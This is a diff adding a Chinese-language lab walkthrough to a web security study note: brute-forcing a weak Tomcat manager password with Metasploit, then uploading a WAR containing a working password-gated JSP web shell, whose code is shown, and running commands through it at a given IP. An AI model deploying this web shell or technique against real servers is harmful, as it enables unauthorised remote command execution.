@@ -346,17 +346,55 @@ CSRF危害：
 
 ### 3.12 Tomcat 后台弱口令&&get shell
 
+搭建环境
+
+![image-20220527213735194](web应用安全.assets/image-20220527213735194.png)
+
+访问，登录
+
+![image-20220527213722663](web应用安全.assets/image-20220527213722663.png)
+
+用msf 攻击
+
+![image-20220527214616760](web应用安全.assets/image-20220527214616760.png)
 
 
 
+![image-20220527214629920](web应用安全.assets/image-20220527214629920.png)
 
+拿到账号和密码
 
+![image-20220527214712534](web应用安全.assets/image-20220527214712534.png)
 
+写一个jsp
 
+```jsp
+<%
+  if("x".equals(request.getParameter("pwd")))
+  {
+      java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+      int a = -1;
+      byte[] b = new byte[2048];
+      out.print("<pre>");
+      while((a = in.read(b))!=-1)
+      {
+          out.println(new String(b));
+      }
+      out.print("</pre>");
+      
+  }
+%>
+```
 
+![image-20220527220806628](web应用安全.assets/image-20220527220806628.png)
 
+把jsp压缩成zip再把后缀改为war上传
 
+之后访问
 
+`http://183.129.189.61:60103/shell/shell.jsp?pwd=x&i=uname%20-a`
+
+![image-20220527221613394](web应用安全.assets/image-20220527221613394.png)
 
 
 
